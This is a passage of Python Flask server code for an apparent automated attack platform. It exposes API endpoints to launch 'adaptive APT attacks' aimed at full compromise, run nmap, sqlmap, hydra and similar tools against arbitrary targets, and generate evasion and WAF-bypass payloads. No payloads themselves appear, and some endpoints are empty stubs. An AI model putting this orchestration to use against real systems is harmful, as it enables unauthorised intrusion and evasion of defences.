        logger.error(f"Error getting workflow status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/system/stats", methods=["GET"])
def get_system_stats():
    """获取系统统计信息"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500
            
        stats = task_manager.get_system_stats()
        return jsonify({
            "success": True,
            "system_stats": stats
        })
        
    except Exception as e:
        logger.error(f"Error getting system stats: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== 自适应攻击API端点 ====================

@app.route("/api/apt/adaptive-attack/start", methods=["POST"])
def start_adaptive_attack():
    """启动自适应APT攻击"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        if not target:
            return jsonify({"error": "Target is required"}), 400

        target_info = data.get("target_info", {})
        attack_objective = data.get("attack_objective", "full_compromise")

        # 启动自适应攻击
        attack_id = task_manager.adaptive_orchestrator.start_adaptive_attack(
            target, target_info, attack_objective
        )

        return jsonify({
            "success": True,
            "attack_id": attack_id,
            "message": f"自适应APT攻击已启动，攻击ID: {attack_id}",
            "target": target,
            "attack_objective": attack_objective
        })

    except Exception as e:
        logger.error(f"Error starting adaptive attack: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/apt/adaptive-attack/<attack_id>/status", methods=["GET"])
def get_adaptive_attack_status(attack_id):
    """获取自适应攻击状态"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        status = task_manager.adaptive_orchestrator.get_attack_status(attack_id)

        if "error" in status:
            return jsonify(status), 404

        return jsonify({
            "success": True,
            "attack_status": status
        })

    except Exception as e:
        logger.error(f"Error getting adaptive attack status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/apt/adaptive-attack/<attack_id>/next-phase", methods=["POST"])
def trigger_next_attack_phase(attack_id):
    """手动触发下一攻击阶段"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        # 手动触发下一轮攻击
        task_manager.adaptive_orchestrator._execute_attack_round(attack_id)

        return jsonify({
            "success": True,
            "message": f"已触发攻击 {attack_id} 的下一阶段"
        })

    except Exception as e:
        logger.error(f"Error triggering next attack phase: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/mcp/capabilities", methods=["GET"])
def get_capabilities():
    # Return tool capabilities similar to our existing MCP server
    pass

@app.route("/mcp/tools/kali_tools/<tool_name>", methods=["POST"])
def execute_tool(tool_name):
    # Direct tool execution without going through the API server
    pass

# ==================== CTF专用API端点 ====================

@app.route("/api/ctf/mode/enable", methods=["POST"])
def enable_ctf_mode():
    """启用CTF模式"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        task_manager.ctf_mode = True
        logger.info("CTF模式已启用")

        return jsonify({
            "success": True,
            "message": "CTF模式已启用",
            "ctf_mode": True
        })

    except Exception as e:
        logger.error(f"Error enabling CTF mode: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/mode/disable", methods=["POST"])
def disable_ctf_mode():
    """禁用CTF模式"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        task_manager.ctf_mode = False
        logger.info("CTF模式已禁用")

        return jsonify({
            "success": True,
            "message": "CTF模式已禁用",
            "ctf_mode": False
        })

    except Exception as e:
        logger.error(f"Error disabling CTF mode: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/session/create", methods=["POST"])
def create_ctf_session():
    """创建CTF竞赛会话"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.json
        name = data.get("name", "CTF Session")
        team_name = data.get("team_name", "")

        session_id = task_manager.ctf_manager.create_session(name, team_name)

        return jsonify({
            "success": True,
            "session_id": session_id,
            "name": name,
            "team_name": team_name,
            "start_time": task_manager.ctf_manager.current_session.start_time.isoformat()
        })

    except Exception as e:
        logger.error(f"Error creating CTF session: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/challenge/add", methods=["POST"])
def add_ctf_challenge():
    """添加CTF题目"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.json
        name = data.get("name", "")
        category = data.get("category", "misc")
        port = data.get("port", 80)
        service = data.get("service", "http")

        if not name:
            return jsonify({"error": "Challenge name is required"}), 400

        challenge_name = task_manager.ctf_manager.add_challenge(name, category, port, service)

        return jsonify({
            "success": True,
            "challenge_name": challenge_name,
            "category": category,
            "port": port,
            "service": service
        })

    except Exception as e:
        logger.error(f"Error adding CTF challenge: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/flags/detected", methods=["GET"])
def get_detected_flags():
    """获取检测到的所有Flag"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        all_flags = []
        for challenge in task_manager.ctf_manager.challenges.values():
            for flag in challenge.flags:
                all_flags.append({
                    "content": flag.content,
                    "format_type": flag.format_type,
                    "source": flag.source,
                    "confidence": flag.confidence,
                    "discovered_at": flag.discovered_at.isoformat(),
                    "submitted": flag.submitted,
                    "points": flag.points,
                    "challenge_name": challenge.name
                })

        return jsonify({
            "success": True,
            "total_flags": len(all_flags),
            "flags": all_flags
        })

    except Exception as e:
        logger.error(f"Error getting detected flags: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/challenges/status", methods=["GET"])
def get_challenges_status():
    """获取所有题目状态"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        challenges = []
        for challenge in task_manager.ctf_manager.challenges.values():
            challenges.append({
                "name": challenge.name,
                "category": challenge.category,
                "port": challenge.port,
                "service": challenge.service,
                "status": challenge.status,
                "flags_count": len(challenge.flags),
                "start_time": challenge.start_time.isoformat() if challenge.start_time else None,
                "solve_time": challenge.solve_time.isoformat() if challenge.solve_time else None
            })

        return jsonify({
            "success": True,
            "total_challenges": len(challenges),
            "challenges": challenges
        })

    except Exception as e:
        logger.error(f"Error getting challenges status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== WebSocket长连接和持久化任务系统 ====================

class PersistentConnection:
    """持久化连接数据结构"""
    def __init__(self, session_id: str, client_id: str):
        self.session_id = session_id
        self.client_id = client_id
        self.connected_at = datetime.now()
        self.last_heartbeat = datetime.now()
        self.active_tasks = set()
        self.task_queue = queue.Queue()
        self.is_alive = True

class WebSocketConnectionManager:
    """WebSocket连接管理器 - 解决网络超时和稳定性问题"""

    def __init__(self):
        self.connections = {}  # session_id -> PersistentConnection
        self.connection_lock = threading.Lock()
        self.heartbeat_interval = 30  # 30秒心跳
        self.connection_timeout = 180  # 3分钟超时
        self.task_retry_limit = 3
        self.background_thread = None
        self.running = False

        logger.info("WebSocket连接管理器初始化完成")

    def start_background_monitor(self):
        """启动后台监控线程"""
        if self.background_thread is None or not self.background_thread.is_alive():
            self.running = True
            self.background_thread = threading.Thread(target=self._monitor_connections)
            self.background_thread.daemon = True
            self.background_thread.start()
            logger.info("WebSocket后台监控线程已启动")

    def stop_background_monitor(self):
        """停止后台监控"""
        self.running = False
        if self.background_thread and self.background_thread.is_alive():
            self.background_thread.join(timeout=5)
            logger.info("WebSocket后台监控线程已停止")

    def _monitor_connections(self):
        """后台监控连接状态和心跳"""
        while self.running:
            try:
                current_time = datetime.now()
                dead_connections = []

                with self.connection_lock:
                    for session_id, conn in self.connections.items():
                        # 检查心跳超时
                        if (current_time - conn.last_heartbeat).total_seconds() > self.connection_timeout:
                            logger.warning(f"连接 {session_id} 心跳超时，标记为死连接")
                            conn.is_alive = False
                            dead_connections.append(session_id)

                        # 处理任务队列
                        self._process_task_queue(conn)

                # 清理死连接
                for session_id in dead_connections:
                    self._cleanup_connection(session_id)

                # 发送心跳包
                self._send_heartbeat_to_all()

                time.sleep(self.heartbeat_interval)

            except Exception as e:
                logger.error(f"连接监控线程异常: {str(e)}")
                time.sleep(5)  # 异常时等待5秒再继续

    def register_connection(self, session_id: str, client_id: str = None) -> bool:
        """注册新连接"""
        if client_id is None:
            client_id = str(uuid.uuid4())

        with self.connection_lock:
            if session_id in self.connections:
                # 更新现有连接
                self.connections[session_id].last_heartbeat = datetime.now()
                self.connections[session_id].is_alive = True
                logger.info(f"重新激活连接: {session_id}")
            else:
                # 创建新连接
                self.connections[session_id] = PersistentConnection(session_id, client_id)
                logger.info(f"注册新连接: {session_id} (客户端: {client_id})")

        return True

    def update_heartbeat(self, session_id: str) -> bool:
        """更新心跳时间戳"""
        with self.connection_lock:
            if session_id in self.connections:
                self.connections[session_id].last_heartbeat = datetime.now()
                self.connections[session_id].is_alive = True
                return True

        logger.warning(f"尝试更新不存在的连接心跳: {session_id}")
        return False

    def submit_persistent_task(self, session_id: str, task_data: Dict[str, Any]) -> str:
        """提交持久化任务 - 即使连接断开也会重试"""
        task_id = str(uuid.uuid4())
        task = {
            "task_id": task_id,
            "session_id": session_id,
            "data": task_data,
            "created_at": datetime.now(),
            "retry_count": 0,
            "status": "queued"
        }

        with self.connection_lock:
            if session_id in self.connections:
                self.connections[session_id].task_queue.put(task)
                self.connections[session_id].active_tasks.add(task_id)
                logger.info(f"任务 {task_id} 已加入会话 {session_id} 的持久化队列")
                return task_id

        logger.error(f"无法提交任务到不存在的会话: {session_id}")
        return ""

    def _process_task_queue(self, conn: PersistentConnection):
        """处理连接的任务队列"""
        while not conn.task_queue.empty():
            try:
                task = conn.task_queue.get_nowait()

                # 检查任务状态
                if task["retry_count"] >= self.task_retry_limit:
                    logger.error(f"任务 {task['task_id']} 重试次数超限，放弃执行")
                    conn.active_tasks.discard(task["task_id"])
                    continue

                # 尝试执行任务
                success = self._execute_persistent_task(task)

                if success:
                    logger.info(f"任务 {task['task_id']} 执行成功")
                    conn.active_tasks.discard(task["task_id"])
                else:
                    # 重新入队等待重试
                    task["retry_count"] += 1
                    conn.task_queue.put(task)
                    logger.warning(f"任务 {task['task_id']} 执行失败，重试计数: {task['retry_count']}")

            except queue.Empty:
                break
            except Exception as e:
                logger.error(f"处理任务队列异常: {str(e)}")

    def _execute_persistent_task(self, task: Dict[str, Any]) -> bool:
        """执行持久化任务"""
        try:
            task_data = task["data"]
            tool_name = task_data.get("tool_name")
            parameters = task_data.get("parameters", {})

            if not tool_name:
                logger.error(f"任务 {task['task_id']} 缺少工具名称")
                return False

            # 这里执行实际的工具调用
            # 根据工具名称调用相应的执行函数
            result = self._call_tool_function(tool_name, parameters)

            # 通过WebSocket发送结果给客户端
            self._send_task_result(task["session_id"], task["task_id"], result)

            return True

        except Exception as e:
            logger.error(f"执行持久化任务异常: {str(e)}")
            return False

    def _call_tool_function(self, tool_name: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """调用工具函数 - 映射到实际的工具执行"""
        try:
            # 这里根据tool_name调用相应的工具函数
            # 由于工具函数分散在各处，我们通过全局引用调用

            if tool_name == "nmap":
                return execute_nmap(parameters)
            elif tool_name == "gobuster":
                return execute_gobuster(parameters)
            elif tool_name == "sqlmap":
                return execute_sqlmap(parameters)
            elif tool_name == "nuclei":
                return execute_nuclei(parameters)
            elif tool_name == "hydra":
                return execute_hydra(parameters)
            # ... 可以继续添加其他工具

            else:
                logger.warning(f"未知的工具类型: {tool_name}")
                return {"error": f"Unknown tool: {tool_name}", "success": False}

        except Exception as e:
            logger.error(f"工具调用异常 {tool_name}: {str(e)}")
            return {"error": f"Tool execution failed: {str(e)}", "success": False}

    def _send_task_result(self, session_id: str, task_id: str, result: Dict[str, Any]):
        """通过WebSocket发送任务结果"""
        try:
            socketio.emit('task_result', {
                'task_id': task_id,
                'session_id': session_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }, room=session_id)

        except Exception as e:
            logger.error(f"发送任务结果失败: {str(e)}")

    def _send_heartbeat_to_all(self):
        """向所有活跃连接发送心跳"""
        with self.connection_lock:
            for session_id, conn in self.connections.items():
                if conn.is_alive:
                    try:
                        socketio.emit('heartbeat', {
                            'timestamp': datetime.now().isoformat(),
                            'active_tasks': len(conn.active_tasks)
                        }, room=session_id)
                    except Exception as e:
                        logger.warning(f"发送心跳到 {session_id} 失败: {str(e)}")

    def _cleanup_connection(self, session_id: str):
        """清理死连接"""
        with self.connection_lock:
            if session_id in self.connections:
                conn = self.connections[session_id]
                logger.info(f"清理连接 {session_id}，剩余活跃任务: {len(conn.active_tasks)}")

                # 将未完成的任务标记为失败
                for task_id in conn.active_tasks:
                    logger.warning(f"任务 {task_id} 因连接断开而失败")

                del self.connections[session_id]

    def get_connection_stats(self) -> Dict[str, Any]:
        """获取连接统计信息"""
        with self.connection_lock:
            active_connections = sum(1 for conn in self.connections.values() if conn.is_alive)
            total_active_tasks = sum(len(conn.active_tasks) for conn in self.connections.values())

            return {
                "total_connections": len(self.connections),
                "active_connections": active_connections,
                "total_active_tasks": total_active_tasks,
                "connections_detail": {
                    sid: {
                        "client_id": conn.client_id,
                        "connected_at": conn.connected_at.isoformat(),
                        "last_heartbeat": conn.last_heartbeat.isoformat(),
                        "is_alive": conn.is_alive,
                        "active_tasks": len(conn.active_tasks)
                    }
                    for sid, conn in self.connections.items()
                }
            }

# WebSocket事件处理器
@socketio.on('connect')
def handle_connect():
    """客户端连接事件"""
    session_id = request.sid
    client_id = request.args.get('client_id', str(uuid.uuid4()))

    # 注册连接
    if 'websocket_manager' in globals():
        websocket_manager.register_connection(session_id, client_id)

    logger.info(f"WebSocket客户端连接: {session_id} (客户端ID: {client_id})")

    # 发送连接确认
    emit('connection_established', {
        'session_id': session_id,
        'client_id': client_id,
        'timestamp': datetime.now().isoformat(),
        'message': 'WebSocket连接建立成功'
    })

@socketio.on('disconnect')
def handle_disconnect():
    """客户端断开事件"""
    session_id = request.sid
    logger.info(f"WebSocket客户端断开: {session_id}")

@socketio.on('heartbeat')
def handle_heartbeat():
    """处理客户端心跳"""
    session_id = request.sid

    if 'websocket_manager' in globals():
        websocket_manager.update_heartbeat(session_id)

    # 响应心跳
    emit('heartbeat_ack', {
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('submit_task')
def handle_submit_task(data):
    """处理任务提交"""
    session_id = request.sid

    try:
        if 'websocket_manager' not in globals():
            emit('task_error', {'error': 'WebSocket管理器未初始化'})
            return

        # 验证任务数据
        if not data or 'tool_name' not in data:
            emit('task_error', {'error': '缺少必要的任务数据'})
            return

        # 提交持久化任务
        task_id = websocket_manager.submit_persistent_task(session_id, data)

        if task_id:
            emit('task_submitted', {
                'task_id': task_id,
                'session_id': session_id,
                'message': '任务已提交到持久化队列'
            })
        else:
            emit('task_error', {'error': '任务提交失败'})

    except Exception as e:
        logger.error(f"处理任务提交异常: {str(e)}")
        emit('task_error', {'error': f'任务提交异常: {str(e)}'})

@socketio.on('get_connection_stats')
def handle_get_stats():
    """获取连接统计信息"""
    try:
        if 'websocket_manager' in globals():
            stats = websocket_manager.get_connection_stats()
            emit('connection_stats', stats)
        else:
            emit('stats_error', {'error': 'WebSocket管理器未初始化'})
    except Exception as e:
        logger.error(f"获取连接统计异常: {str(e)}")
        emit('stats_error', {'error': str(e)})

# 全局WebSocket管理器实例
websocket_manager = None

# ==================== 智能分析 API 端点 ====================

@app.route("/api/intelligence/optimize-parameters", methods=["POST"])
def optimize_parameters():
    """优化工具参数"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        tool = data.get("tool")
        target_type = data.get("target_type", "unknown")
        time_constraint = data.get("time_constraint", "quick")
        stealth_mode = data.get("stealth_mode", False)

        if not tool:
            return jsonify({"error": "Tool parameter is required"}), 400

        if 'parameter_optimizer' not in globals():
            return jsonify({"error": "Parameter optimizer not initialized"}), 500

        optimal_params = parameter_optimizer.get_optimal_params(
            tool=tool,
            target_type=target_type,
            time_constraint=time_constraint,
            stealth_mode=stealth_mode
        )

        return jsonify({
            "success": True,
            "tool": tool,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode,
            "optimal_parameters": optimal_params
        })

    except Exception as e:
        logger.error(f"Error optimizing parameters: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/correlate-results", methods=["POST"])
def correlate_results():
    """关联多工具扫描结果"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        tool_results = data.get("tool_results", {})
        if not tool_results:
            return jsonify({"error": "tool_results parameter is required"}), 400

        if 'correlation_engine' not in globals():
            return jsonify({"error": "Correlation engine not initialized"}), 500

        correlations = correlation_engine.correlate_results(tool_results)

        # 转换为可序列化格式
        serialized_correlations = []
        for finding in correlations:
            serialized_correlations.append({
                "finding_type": finding.finding_type,
                "description": finding.description,
                "confidence": finding.confidence,
                "related_tools": finding.related_tools,
                "evidence": finding.evidence,
                "recommendations": finding.recommendations
            })

        return jsonify({
            "success": True,
            "correlations_found": len(serialized_correlations),
            "findings": serialized_correlations
        })

    except Exception as e:
        logger.error(f"Error correlating results: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/adaptive-scan-plan", methods=["POST"])
def generate_adaptive_scan_plan():
    """生成自适应扫描计划"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        initial_results = data.get("initial_results", {})
        time_budget = data.get("time_budget", "standard")

        if not target:
            return jsonify({"error": "target parameter is required"}), 400

        if 'adaptive_strategy' not in globals():
            return jsonify({"error": "Adaptive strategy not initialized"}), 500

        scan_plan = adaptive_strategy.generate_adaptive_scan_plan(
            target=target,
            initial_results=initial_results,
            time_budget=time_budget
        )

        # 转换为可序列化格式
        serialized_plan = []
        for step in scan_plan:
            serialized_plan.append({
                "tool": step.tool,
                "parameters": step.parameters,
                "priority": step.priority,
                "estimated_time": step.estimated_time,
                "dependencies": step.dependencies
            })

        return jsonify({
            "success": True,
            "target": target,
            "time_budget": time_budget,
            "total_steps": len(serialized_plan),
            "estimated_total_time": sum(step.estimated_time for step in scan_plan),
            "scan_plan": serialized_plan
        })

    except Exception as e:
        logger.error(f"Error generating adaptive scan plan: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/smart-scan", methods=["POST"])
def smart_scan():
    """智能扫描 - 集成参数优化和自适应策略的全流程扫描"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        scan_objectives = data.get("objectives", ["port_scan", "web_scan"])
        time_budget = data.get("time_budget", "standard")
        stealth_mode = data.get("stealth_mode", False)

        if not target:
            return jsonify({"error": "target parameter is required"}), 400

        if not all(mod in globals() for mod in ['parameter_optimizer', 'adaptive_strategy']):
            return jsonify({"error": "Intelligence modules not initialized"}), 500

        # 生成自适应扫描计划
        scan_plan = adaptive_strategy.generate_adaptive_scan_plan(
            target=target,
            time_budget=time_budget
        )

        # 为每个扫描步骤优化参数
        optimized_tasks = []
        for step in scan_plan:
            # 确定目标类型（基于目标格式简单判断）
            target_type = "web" if target.startswith("http") else "network"

            optimal_params = parameter_optimizer.get_optimal_params(
                tool=step.tool,
                target_type=target_type,
                time_constraint=time_budget,
                stealth_mode=stealth_mode
            )

            # 合并优化后的参数
            final_params = {**step.parameters, **optimal_params}

            optimized_tasks.append({
                "tool": step.tool,
                "original_parameters": step.parameters,
                "optimized_parameters": final_params,
                "priority": step.priority,
                "estimated_time": step.estimated_time
            })

        return jsonify({
            "success": True,
            "target": target,
            "scan_objectives": scan_objectives,
            "time_budget": time_budget,
            "stealth_mode": stealth_mode,
            "total_tasks": len(optimized_tasks),
            "estimated_total_time": sum(task["estimated_time"] for task in optimized_tasks),
            "optimized_scan_plan": optimized_tasks
        })

    except Exception as e:
        logger.error(f"Error in smart scan: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/target-analysis", methods=["POST"])
def analyze_target():
    """目标分析 - 基于初步扫描结果分析目标特征"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        scan_results = data.get("scan_results", {})

        if not target:
            return jsonify({"error": "target parameter is required"}), 400

        if 'parameter_optimizer' not in globals():
            return jsonify({"error": "Parameter optimizer not initialized"}), 500

        # 分析目标类型
        target_analysis = parameter_optimizer._analyze_target_type(target, scan_results)

        # 获取推荐的攻击向量
        attack_vectors = []
        if "ports" in scan_results:
            for port_info in scan_results["ports"]:
                service = port_info.get("service", "unknown")
                vectors = parameter_optimizer._get_attack_vectors_for_service(service)
                attack_vectors.extend(vectors)

        return jsonify({
            "success": True,
            "target": target,
            "target_type": target_analysis,
            "recommended_attack_vectors": list(set(attack_vectors)),
            "analysis_summary": {
                "web_services": any("http" in str(port) for port in scan_results.get("ports", [])),
                "ssh_available": any("ssh" in str(port) for port in scan_results.get("ports", [])),
                "smb_available": any("smb" in str(port) for port in scan_results.get("ports", [])),
                "database_services": any("sql" in str(port) for port in scan_results.get("ports", []))
            }
        })

    except Exception as e:
        logger.error(f"Error analyzing target: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== 智能Payload生成器 API 端点 ====================

@app.route("/api/payload/generate", methods=["POST"])
def generate_intelligent_payload():
    """生成智能化Payload"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        vulnerability_type = data.get("vulnerability_type")
        target_info = data.get("target_info", {})
        evasion_level = data.get("evasion_level", "medium")
        quantity = data.get("quantity", 5)

        if not vulnerability_type:
            return jsonify({"error": "vulnerability_type parameter is required"}), 400

        if 'payload_generator' not in globals():
            return jsonify({"error": "Payload generator not initialized"}), 500

        # 生成Payload
        result = payload_generator.generate_intelligent_payload(
            vulnerability_type=vulnerability_type,
            target_info=target_info,
            evasion_level=evasion_level,
            quantity=quantity
        )

        return jsonify({
            "success": True,
            "vulnerability_type": vulnerability_type,
            "target_info": target_info,
            "evasion_level": evasion_level,
            "original_payload": result.original_payload,
            "generated_payloads": result.generated_payloads,
            "encoding_used": result.encoding_used,
            "evasion_techniques": result.evasion_techniques,
            "target_compatibility": result.target_compatibility,
            "estimated_success_rate": result.estimated_success_rate,
            "total_generated": len(result.generated_payloads)
        })

    except Exception as e:
        logger.error(f"Error generating intelligent payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/payload/polyglot", methods=["POST"])
def generate_polyglot_payload():
    """生成多语言通用Payload"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target_contexts = data.get("target_contexts", [])
        target_info = data.get("target_info", {})

        if not target_contexts:
            return jsonify({"error": "target_contexts parameter is required"}), 400

        if 'payload_generator' not in globals():
            return jsonify({"error": "Payload generator not initialized"}), 500

        # 生成Polyglot Payload
        result = payload_generator.generate_polyglot_payload(target_contexts, target_info)

        return jsonify({
            "success": True,
            "target_contexts": target_contexts,
            "target_info": target_info,
            "generated_payloads": result.generated_payloads,
            "encoding_used": result.encoding_used,
            "evasion_techniques": result.evasion_techniques,
            "estimated_success_rate": result.estimated_success_rate
        })

    except Exception as e:
        logger.error(f"Error generating polyglot payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/payload/feedback", methods=["POST"])
def update_payload_feedback():
    """更新Payload成功率反馈"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        payload_info = data.get("payload_info", {})
        success = data.get("success", False)

        if not payload_info:
            return jsonify({"error": "payload_info parameter is required"}), 400

        if 'payload_generator' not in globals():
            return jsonify({"error": "Payload generator not initialized"}), 500

        # 更新成功率反馈
        payload_generator.update_success_feedback(payload_info, success)

        return jsonify({
            "success": True,
            "message": "Payload feedback updated successfully",
            "payload_info": payload_info,
            "feedback_success": success
        })

    except Exception as e:
        logger.error(f"Error updating payload feedback: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/payload/templates", methods=["GET"])
def get_payload_templates():
    """获取可用的Payload模板"""
    try:
        if 'payload_generator' not in globals():
            return jsonify({"error": "Payload generator not initialized"}), 500

        templates_info = {}
        for vuln_type, templates in payload_generator.payload_templates.items():
            templates_info[vuln_type] = []
            for template in templates:
                templates_info[vuln_type].append({
                    "name": template.name,
                    "target_platforms": template.target_platforms,
                    "encoding_methods": template.encoding_methods,
                    "evasion_techniques": template.evasion_techniques,
                    "success_indicators": template.success_indicators
                })

        return jsonify({
            "success": True,
            "vulnerability_types": list(templates_info.keys()),
            "templates": templates_info,
            "total_templates": sum(len(templates) for templates in templates_info.values())
        })

    except Exception as e:
        logger.error(f"Error getting payload templates: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/payload/waf-bypass", methods=["POST"])
def generate_waf_bypass_payload():
    """生成WAF绕过Payload"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        vulnerability_type = data.get("vulnerability_type")
        waf_type = data.get("waf_type", "unknown")
        original_payload = data.get("original_payload", "")

        if not vulnerability_type:
            return jsonify({"error": "vulnerability_type parameter is required"}), 400

        if 'payload_generator' not in globals():
            return jsonify({"error": "Payload generator not initialized"}), 500

        # 构造目标信息，重点关注WAF类型
        target_info = {
            "waf_type": waf_type,
            "waf_detected": True,
            "platform": "web"
        }

        # 生成高级规避Payload
        result = payload_generator.generate_intelligent_payload(
            vulnerability_type=vulnerability_type,
            target_info=target_info,
            evasion_level="high",
            quantity=10  # 生成更多变种
        )

        return jsonify({
            "success": True,
            "vulnerability_type": vulnerability_type,
            "waf_type": waf_type,
            "original_payload": original_payload,
            "waf_bypass_payloads": result.generated_payloads,
            "encoding_used": result.encoding_used,
            "evasion_techniques": result.evasion_techniques,
            "estimated_success_rate": result.estimated_success_rate,
            "bypass_strategies": [
                "Multiple encoding layers",
                "WAF signature evasion",
                "Context-aware obfuscation",
                "Dynamic payload generation"
            ]
        })

    except Exception as e:
        logger.error(f"Error generating WAF bypass payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== PoC生成和攻击日志API端点 ====================

@app.route("/api/attack/start-session", methods=["POST"])
def start_attack_session():
    """开始新的攻击会话"""
    try:
        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        if not target:
            return jsonify({"error": "Target is required"}), 400

        mode = data.get("mode", "apt")  # "apt" or "ctf"
        session_name = data.get("session_name", "")

        session_id = attack_logger.start_session(target, mode, session_name)

        return jsonify({
            "success": True,
            "session_id": session_id,
            "target": target,
            "mode": mode,
            "message": f"攻击会话已启动 (模式: {mode.upper()})"
        })

    except Exception as e:
        logger.error(f"Error starting attack session: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/attack/log-step", methods=["POST"])
def log_attack_step():
    """记录攻击步骤"""
    try:
        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        tool_name = data.get("tool_name")
        command = data.get("command")
        parameters = data.get("parameters", {})
        success = data.get("success", False)
        output = data.get("output", "")
        error = data.get("error", "")
        payload = data.get("payload", "")

        if not tool_name or not command:
            return jsonify({"error": "tool_name and command are required"}), 400

        step_id = attack_logger.log_attack_step(
            tool_name, command, parameters, success, output, error, payload
        )

        # 获取当前会话状态
        current_session = attack_logger.session_logs.get(attack_logger.current_session, {})

        return jsonify({
            "success": True,
            "step_id": step_id,
            "vulnerabilities_found": len([s for s in current_session.get("attack_steps", []) if hasattr(s, 'vulnerability_found') and s.vulnerability_found]),
            "flags_found": len(current_session.get("flags_found", [])),
            "current_capabilities": current_session.get("current_capabilities", []),
            "message": "攻击步骤已记录"
        })

    except Exception as e:
        logger.error(f"Error logging attack step: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/attack/end-session", methods=["POST"])
def end_attack_session():
    """结束攻击会话"""
    try:
        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        session_data = attack_logger.end_session()

        if not session_data:
            return jsonify({"error": "No active session to end"}), 400

        return jsonify({
            "success": True,
            "session_data": session_data,
            "session_id": session_data.get("session_id"),
            "duration": session_data.get("duration", 0),
            "total_steps": len(session_data.get("attack_steps", [])),
            "flags_found": len(session_data.get("flags_found", [])),
            "compromise_level": session_data.get("compromise_level", "none"),
            "message": "攻击会话已结束"
        })

    except Exception as e:
        logger.error(f"Error ending attack session: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/attack/session/<session_id>", methods=["GET"])
def get_attack_session(session_id):
    """获取攻击会话详情"""
    try:
        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        session_data = attack_logger.session_logs.get(session_id)
        if not session_data:
            return jsonify({"error": "Session not found"}), 404

        # 序列化AttackStep对象
        serialized_session = attack_logger._make_serializable(session_data)

        return jsonify({
            "success": True,
            "session_data": serialized_session
        })

    except Exception as e:
